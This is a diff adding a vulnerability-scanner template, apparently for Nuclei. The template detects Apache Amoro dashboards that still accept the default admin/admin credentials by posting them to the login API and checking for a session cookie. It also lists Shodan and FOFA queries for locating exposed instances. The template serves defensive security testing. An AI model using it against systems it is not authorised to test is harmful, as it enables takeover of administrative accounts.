@@ -1,0 +1,70 @@
+id: apache-amoro-default-login
+
+info:
+  name: Apache Amoro - Default Login
+  author: s4e-io
+  severity: high
+  description: |
+    Apache Amoro ships with the dashboard administrator credentials admin/admin in the default AMS configuration, and the default login provider accepts them until ams.admin-password is changed. An attacker who logs in with these credentials gains administrative access to the Amoro Management Service, including catalogs, optimizer groups, table maintenance and the SQL terminal.
+  reference:
+    - https://amoro.apache.org/quick-start/
+    - https://github.com/apache/amoro/blob/v0.9.0-incubating/dist/src/main/amoro-bin/conf/config.yaml
+    - https://github.com/apache/amoro/blob/v0.9.0-incubating/amoro-ams/src/main/java/org/apache/amoro/server/dashboard/controller/LoginController.java
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    vendor: apache
+    product: amoro
+    shodan-query: http.title:"Apache Amoro"
+    fofa-query: title="Apache Amoro"
+  tags: amoro,apache,default-login,vuln
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    host-redirects: true
+    max-redirects: 2
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "<title>Apache Amoro")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /api/ams/v1/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"user":"{{username}}","password":"{{password}}"}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "\"code\":200", "\"message\":\"success\"")'
+          - 'contains(header, "JSESSIONID=")'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - username + ":" + password
